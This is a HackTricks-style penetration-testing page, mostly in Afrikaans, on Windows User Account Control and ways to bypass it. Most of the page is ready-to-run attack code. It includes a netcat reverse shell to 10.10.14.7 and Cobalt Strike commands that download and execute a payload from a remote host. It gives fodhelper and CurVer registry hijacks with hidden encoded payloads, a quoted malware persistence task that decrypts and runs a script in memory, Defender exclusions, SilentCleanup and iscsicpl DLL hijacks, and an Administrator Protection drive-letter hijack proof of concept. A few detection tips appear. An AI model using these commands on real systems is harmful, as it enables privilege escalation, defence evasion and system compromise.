# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n kenmerk wat 'n **toestemmingsaanporboodskap vir verhoogde aktiwiteite** moontlik maak. Toepassings het verskillende `integrity`-vlakke, en 'n program met 'n **hoë vlak** kan take uitvoer wat die **stelsel potensieel kan kompromitteer**. Wanneer UAC geaktiveer is, **loop toepassings en take altyd onder die sekuriteitskonteks van 'n nie-administrateurrekening** tensy 'n administrateur hierdie toepassings/take uitdruklik magtig om administrateurvlaktoegang tot die stelsel te hê om uit te voer. Dit is 'n geriefskenmerk wat administrateurs teen onbedoelde veranderinge beskerm, maar dit word nie as 'n sekuriteitsgrens beskou nie.<sup>[[2]](#references)</sup>

Vir meer inligting oor integrity-vlakke:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wanneer UAC in plek is, word 'n administrateurgebruiker 2 tokens gegee: 'n standaardgebruikertoken om gewone aksies met medium integrity uit te voer, en een met die administrateurvoorregte.

Hierdie [bladsy](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek in groot diepte hoe UAC werk en sluit die aanmeldproses, gebruikerservaring en UAC-argitektuur in.<sup>[[2]](#references)</sup> Administrateurs kan sekuriteitsbeleide gebruik om op plaaslike vlak te konfigureer hoe UAC spesifiek vir hul organisasie werk (deur secpol.msc te gebruik), of dit deur Group Policy Objects (GPO) in 'n Active Directory-domeinomgewing te konfigureer en uit te stoot. Die verskillende instellings word [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) breedvoerig bespreek. Daar is 10 Group Policy-instellings wat vir UAC gestel kan word. Die volgende tabel verskaf verdere besonderhede:

| Group Policy-instelling                                                                                                                                                                                                                                                                                                                                                           | Register-sleutel                | Verstekinstelling                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Gedeaktiveer)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Vra vir toestemming vir nie-Windows-binaries op die veilige werkskerm) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Vra vir geloofsbriewe op die veilige werkskerm)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Geaktiveer; by verstek op Enterprise gedeaktiveer)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Gedeaktiveer)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Geaktiveer)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Geaktiveer)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Gedeaktiveer)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Geaktiveer)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Geaktiveer)                                              |

### Beleide vir die installering van sagteware op Windows

Die **plaaslike sekuriteitsbeleide** ("secpol.msc" op die meeste stelsels) is by verstek gekonfigureer om **nie-administrateurgebruikers te verhoed om sagteware-installasies uit te voer**. Dit beteken dat selfs al kan 'n nie-administrateurgebruiker die installeerder vir jou sagteware aflaai, hulle dit nie sonder 'n administrateurrekening sal kan uitvoer nie.

### Register-sleutels om UAC te dwing om vir verhoging te vra

As 'n standaardgebruiker sonder administrateurregte kan jy verseker dat die "standaard"-rekening **deur UAC vir geloofsbriewe gevra word** wanneer dit sekere aksies probeer uitvoer. Hierdie aksie sal vereis dat sekere **register-sleutels** gewysig word, waarvoor jy administrateurtoestemmings benodig, tensy daar 'n **UAC bypass** is, of die aanvaller reeds as administrateur aangemeld is.

Selfs al is die gebruiker in die **Administrators**-groep, dwing hierdie veranderinge die gebruiker om hul **rekeninggeloofsbriewe weer in te voer** om administratiewe aksies uit te voer.

**In die praktyk is dit slegs nuttig wanneer jy reeds 'n verhoogde token, 'n UAC bypass of 'n verkeerde konfigurasie het wat jou toelaat om hierdie sleutels te verander; andersins word die registersleutel-skrywing self geblokkeer.**

Die register-sleutels en inskrywings wat jy moet verander, is die volgende (met hul verstekwaardes tussen hakies):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Dit kan ook handmatig deur die Local Security Policy-nutsding gedoen word. Sodra dit verander is, vra administratiewe bewerkings die gebruiker om hul geloofsbriewe weer in te voer.

### Nota

**User Account Control is nie 'n sekuriteitsgrens nie.** Daarom kan standaardgebruikers nie uit hul rekeninge ontsnap en administrateurregte verkry sonder 'n plaaslike privilege escalation-exploit nie.

### Vra 'n gebruiker vir 'full computer access' tieners
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode gebruik integriteitskontroles om te voorkom dat prosesse met 'n hoë integriteitsvlak (soos webblaaiers) toegang verkry tot data met 'n lae integriteitsvlak (soos die vouer met tydelike Internet-lêers). Dit word gedoen deur die blaaier met 'n token met 'n lae integriteitsvlak te laat loop. Wanneer die blaaier probeer om toegang te verkry tot data wat in die lae-integriteitsone gestoor is, kontroleer die bedryfstelsel die integriteitsvlak van die proses en laat dit toegang toe dienooreenkomstig. Hierdie funksie help om te voorkom dat remote code execution-aanvalle toegang tot sensitiewe data op die stelsel verkry.
- Wanneer 'n gebruiker by Windows aanmeld, skep die stelsel 'n toegangstoken wat 'n lys van die gebruiker se regte bevat. Regte word gedefinieer as die kombinasie van 'n gebruiker se toestemmings en vermoëns. Die token bevat ook 'n lys van die gebruiker se credentials, wat credentials is wat gebruik word om die gebruiker teenoor die rekenaar en hulpbronne op die netwerk te authenticate.

### Autoadminlogon

Om Windows op te stel om outomaties tydens opstart by 'n spesifieke gebruiker aan te meld, stel die **`AutoAdminLogon`-registersleutel** in. Dit is nuttig vir kiosk-omgewings of toetsdoeleindes. Gebruik dit slegs op veilige stelsels, aangesien dit die wagwoord in die register blootstel.

Stel die volgende sleutels met die Registerredigeerder of `reg add` in:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = gebruikersnaam
- `DefaultPassword` = wagwoord

Om na normale aanmeldgedrag terug te keer, stel `AutoAdminLogon` op 0.

## UAC bypass

> [!TIP]
> Let daarop dat, indien jy grafiese toegang tot die slagoffer het, UAC bypass eenvoudig is, aangesien jy net op "Yes" kan klik wanneer die UAC-aanporboodskap verskyn.

Die UAC bypass is nodig in die volgende situasie: **UAC is geaktiveer, jou proses loop in 'n konteks met medium integriteit, en jou gebruiker behoort aan die administrateursgroep**.

Dit is belangrik om te noem dat dit **baie moeiliker is om UAC te bypass as dit op die hoogste sekuriteitsvlak (Always) is as wanneer dit op enige van die ander vlakke (Default) is.**

### Fast triage from a medium-integrity shell

Voordat jy 'n bypass probeer, bevestig dat jy in die regte scenario is en karteer die host-bou teenoor bekende werkende metodes:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktiese notas:
- As `EnableLUA=0`, het jy nie 'n bypass nodig nie: enige admin-token kan direk vir hoë integriteit versoek.
- `ConsentPromptBehaviorAdmin=2` of `5` is die algemene scenario vir auto-elevate / COM-gebaseerde bypasses.
- `Always Notify` verhoog die drempel, maar jy behoort steeds die presiese build te toets in plaas daarvan om mislukking te aanvaar: UACME hou steeds rekord van sommige `AlwaysNotify compatible`-metodes op moderne Windows-builds.<sup>[[3]](#references)</sup>

### UAC gedeaktiveer

As UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**), kan jy **'n reverse shell met admin-voorregte uitvoer** (hoë integriteitsvlak) deur iets soos die volgende te gebruik:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Baie** Basiese UAC-"bypass" (volle lêerstelseltoegang)

As jy 'n shell het met 'n gebruiker wat binne die Administrators-groep is, kan jy die **C$**-share wat via SMB gedeel word plaaslik as 'n nuwe skyf mount, en jy sal **toegang tot alles binne die lêerstelsel** hê (selfs die Administrator-tuisgids).

> [!WARNING]
> **Dit lyk asof hierdie truuk nie meer werk nie**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC-bypass met Cobalt Strike

Die Cobalt Strike-tegnieke sal slegs werk as UAC nie op sy maksimumsekuriteitsvlak gestel is nie
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **bypass**.

### Elevated COM-koppelvlakke (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM-objects bly ’n praktiese UAC-oppervlak in moderne builds. `ICMLuaUtil` word steeds deur UACME as werkend op huidige Windows-vertakkings gemonitor, en offensive tooling hou aan om `CMSTPLUA` aan te pas deur ’n interaktiewe desktop-proses, 64-bit-uitvoering en soms PEB/proses-masquerading te kombineer voordat die COM Elevation Moniker aangeroep word.<sup>[[3]](#references)</sup>

Praktiese wenke:
- Verkies ’n **64-bit** proses in die gebruiker se **interaktiewe sessie** (gewoonlik `explorer.exe` of ’n child daarvan).
- As ’n raw shell misluk, probeer weer vanaf ’n BOF / UACME-implementering in plaas van ’n naïewe `CreateProcess`-wrapper.
- Verwag dat child-uitvoering in ’n **afsonderlike elevated proses** plaasvind; baie BOFs elevate nie die huidige beacon in-place nie.

### KRBUACBypass

Dokumentasie en tool by [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) is ’n versameling UAC bypass-tegnieke. Compile dit met Visual Studio of MSBuild; die build skep verskeie uitvoerbare lêers (byvoorbeeld `Source\Akagi\output\x64\Debug\Akagi.exe`), dus kies die metode wat geskik is vir die teiken-build.<sup>[[3]](#references)</sup>\
Wees versigtig: sommige bypasses begin sigbare programme of prompts wat die gebruiker kan waarsku.<sup>[[3]](#references)</sup>

UACME het die **build-weergawe waarin elke tegniek begin werk het**.<sup>[[3]](#references)</sup> Jy kan soek na ’n tegniek wat jou weergawes beïnvloed:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ook deur [hierdie](https://en.wikipedia.org/wiki/Windows_10_version_history)-bladsy te gebruik, kry jy die Windows-vrystelling `1607` uit die build-weergawes.

’n Praktiese werksvloei is om eers die **host build** te beoordeel en dan eers die ooreenstemmende metode uit te voer:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` vergelyk die plaaslike build vinnig met sy bekende UAC methods, wat nuttig is om dooie PoCs vinnig uit te skakel.<sup>[[4]](#references)</sup>
- `UACME` bly die beste publieke katalogus om ’n bypass aan ’n spesifieke build te koppel. Weergawe 3.7.1 het methods 83–85 bygevoeg, terwyl die voorafgaande release bestaande methods weer teen **Windows 11 25H2** getoets het; kontroleer die method table en release notes weer eerder as om aan te neem dat ’n ou PoC steeds onveranderd van toepassing is.<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify-capable WNF/UIAccess-kettings (UACME 3.7.1)

`Always Notify` skakel nie elke UAC bypass uit nie. UACME 3.7.1 implementeer drie nuwe x64 methods wat user-controlled environment/protocol state kombineer met elevated scheduled-task- of UIAccess-gedrag, en merk almal as `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** herlei `SystemRoot` sodat die WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` elevated `taskhostw.exe` `unifiedconsent.dll` laat side-load. UACME volg dit vanaf Windows 10 build 19041.
- **84 — TabTip:** gebruik dieselfde environment-variable primitive teen UIAccess `TabTip.exe`, wat `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` of `rsaenh.dll` laai, afhangend van die build, en pivot dan vanaf die resulterende high-integrity UIAccess-context. UACME volg dit vanaf Windows 8.1 / Server 2016.
- **85 — Narrator:** kaap die per-user `feedback-hub`-protokol, beheer Narrator met `Alt+CapsLock+F`, en launch dan ’n writable kopie van `osk.exe` wat `OskSupport.dll` side-load. Dit vereis ’n interactive desktop en word vanaf Windows 10 1809 / Server 2019 gevolg.

Nadat die payload units en Akagi gebou is soos deur UACME gedokumenteer, invoke die ooreenstemmende method number (die optional command se verstek is `cmd.exe`):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Metodes 84 en 85 is afhanklik van UIAccess/desktop interaction, dus moenie verwag dat hulle onveranderd vanaf Session 0 of ’n non-interactive service shell sal werk nie. Al drie manipuleer environment/protocol state en stage DLLs; inspekteer die implementering en verwyder daardie artefakte ná toetsing.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Die trusted binary `fodhelper.exe` word op moderne Windows outomaties verhoog. Wanneer dit geloods word, bevraagteken dit die per-user Registry-pad hieronder sonder om die `DelegateExecute`-verb te valideer. Deur ’n command daar te plant, kan ’n Medium Integrity-process (user is in Administrators) ’n High Integrity-process sonder ’n UAC-prompt spawn.

Registry-pad wat deur fodhelper bevraagteken word:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell-stappe (stel jou payload in, en trigger dit dan)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Werk wanneer die huidige gebruiker 'n lid van Administrators is en die UAC-vlak verstek/toegeeflik is (nie Always Notify met ekstra beperkings nie).
- Gebruik die `sysnative`-pad om 'n 64-bis PowerShell vanaf 'n 32-bis-proses op 64-bis Windows te begin.
- Payload kan enige command wees (PowerShell, cmd of 'n EXE-pad). Vermy promptende UI's vir stealth.

#### CurVer/extension hijack-variant (HKCU only)

Onlangse samples wat `fodhelper.exe` misbruik, vermy `DelegateExecute` en **redirect eerder die `ms-settings` ProgID** via die per-user `CurVer`-waarde. Die auto-elevated binary resolve steeds die handler onder `HKCU`, dus is geen admin token nodig om die keys te plant nie:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Sodra dit elevated is, **deaktiveer** malware gewoonlik **toekomstige prompts** deur `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` op `0` te stel, en voer dan addisionele defense evasion uit (bv. `Add-MpPreference -ExclusionPath C:\ProgramData`) en herskep persistence om as high integrity te loop. ’n Tipiese persistence-taak stoor ’n **XOR-encrypted PowerShell script** op skyf en dekodeer/voer dit elke uur in-memory uit:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Hierdie variant maak steeds die dropper skoon en laat slegs die staged payloads agter, wat opsporing afhanklik maak van monitering van die **`CurVer` hijack**, peutering met `ConsentPromptBehaviorAdmin`, die skepping van Defender-uitsluitings, of scheduled tasks wat PowerShell in die geheue dekripteer.<sup>[[5]](#references)</sup>

### UAC bypass via `SilentCleanup`-taak (`HKCU\Environment\windir`)

`SilentCleanup` loods `cleanmgr.exe` met die hoogste voorregte en brei `%windir%` uit vanuit die gebruiker se omgewing. As jy `HKCU\Environment\windir` beheer, kan jy daardie uitbreiding na ’n arbitrêre command herlei en hoë integriteit verkry sonder ’n toestemmingsdialoog.<sup>[[8]](#references)</sup> Hierdie metode is steeds die moeite werd om op onlangse builds te toets, omdat UACME die tegniek aktief hou en onlangse issue tracking toon dat Windows 11 24H2 moontlik slegs klein aanpassings aan aanhalingstekens vereis.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
If the task quotes the path on that build, retry with the payload ending in a quote (for example `cmd.exe"`). Always clean up `HKCU\Environment\windir` after testing.

#### Meer UAC bypass

Many classic UAC bypasses that abuse UI flows, COM objects, or desktop interaction require a **full interactive session** with the victim; a common `nc.exe` shell or a service running in **Session 0** is often not enough.

You can often solve that using a **meterpreter** session. Migrate to a **process** that has the **Session** value equal to **1**:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - Meer UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

If you have access to a **GUI you can just accept the UAC prompt** when it appears; you do not really need a technical bypass. Therefore, obtaining a GUI session is often enough to bypass the practical friction added by UAC.

Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.

### Lawaaierige brute-force UAC bypass

If noise is acceptable, a tool such as [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) can repeatedly request elevation until the user accepts it.

### Your own bypass - Basiese UAC bypass methodology

If you take a look at **UACME** you will notice that **many UAC bypasses abuse DLL hijacking** (often by making an elevated binary load an attacker-controlled DLL from a writable path). [Read this to learn how to find a DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### Another UAC bypass technique

Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

The 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` is an **auto-elevated** binary that can be abused to load `iscsiexe.dll` by search order. If you can place a malicious `iscsiexe.dll` inside a **user-writable** folder and then modify the current user `PATH` (for example via `HKCU\Environment\Path`) so that folder is searched, Windows may load the attacker DLL inside the elevated `iscsicpl.exe` process **without showing a UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>

Practical notes:
- This is useful when the current user is in **Administrators** but running at **Medium Integrity** due to UAC.
- The **SysWOW64** copy is the relevant one for this bypass. Treat the **System32** copy as a separate binary and validate behavior independently.
- The primitive is a combination of **auto-elevation** and **DLL search-order hijacking**, so the same ProcMon workflow used for other UAC bypasses is useful to validate the missing DLL load.

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Opsporingsidees:
- Stel 'n waarskuwing op vir `reg add` / registerskrywings na `HKCU\Environment\Path` wat onmiddellik gevolg word deur die uitvoering van `C:\Windows\SysWOW64\iscsicpl.exe`.
- Soek vir `iscsiexe.dll` in **deur gebruikers beheerde** liggings soos `%TEMP%` of `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Korrelleer die bekendstelling van `iscsicpl.exe` met onverwagte child processes of DLL-loads buite die normale Windows-gidse.

### Nuwer navorsing wat afsonderlik nagegaan behoort te word

Sommige chains ná 2024 lyk nie meer soos die klassieke `HKCU\Software\Classes`-registry hijacks nie. Activation-context cache poisoning kan byvoorbeeld 'n **drive remap** en **DLL redirection** kombineer om van medium- na high integrity te beweeg deur trusted UI / auto-elevated binaries soos `ctfmon.exe` en latere teikens soos `fodhelper.exe`. In plaas daarvan om die groot PoC hier te dupliseer, kyk na die kompakte payload-voorbeelde in:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview) drive-letter hijack via per-logon-session DOS device map

> [!NOTE]
> Vanaf Augustus 2026 dokumenteer Microsoft Administrator Protection steeds as 'n **Insider preview**: die uitrol in Oktober 2025 is teruggerol en word vir 'n latere datum beplan. Bevestig dat **Admin Approval Mode with Administrator protection** werklik geaktiveer is en dat die device herlaai is voordat hierdie chains getoets word; 'n standaard 25H2-weergawe-string alleen bewys nie dat die feature aktief is nie.<sup>[[10]](#references)</sup>

Vir die volledige `RAiLaunchAdminProcess` / UIAccess-aanvaloppervlak op Windows 11 25H2 preview builds, kyk na die toegewyde bladsy:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” gebruik shadow-admin-tokens met per-session `\Sessions\0\DosDevices/<LUID>`-maps. Die directory word luiweg deur `SeGetTokenDeviceMap` geskep tydens die eerste `\??`-resolution. Indien die aanvaller die shadow-admin-token slegs op **SecurityIdentification** impersonate, word die directory met die aanvaller as **owner** geskep (`CREATOR OWNER` word geërf), wat drive-letter links moontlik maak wat voorkeur geniet bo `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Stappe:**

1. Roep vanuit 'n low-privileged session `RAiProcessRunOnce` aan om 'n promptless shadow-admin `runonce.exe` te spawn.
2. Dupliseer sy primary token na 'n **identification**-token en impersonate dit terwyl `\??` oopgemaak word om die skepping van `\Sessions\0\DosDevices/<LUID>` onder die aanvaller se ownership af te dwing.
3. Skep 'n `C:`-symlink daar wat na attacker-controlled storage wys; daaropvolgende filesystem accesses in daardie session resolveer `C:` na die attacker path, wat DLL/file hijack sonder 'n prompt moontlik maak.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Op preview hosts teken Administrator Protection goedkeurings en mislukkings aan as ETW-gebeurtenisse **15031** en **15032** onder die `Microsoft-Windows-LUA`-provider. Die gebeurtenisse sluit die versoeker se SID, toepassingspad, uitkoms, bestuurde administrateurrekening en authentication method in, dus is herhaalde exploit-pogings of mislukte UI-beheer nie telemetrie-vry nie.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Hoe User Account Control werk](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Versameling UAC bypass-tegnieke](https://github.com/hfiref0x/UACME)
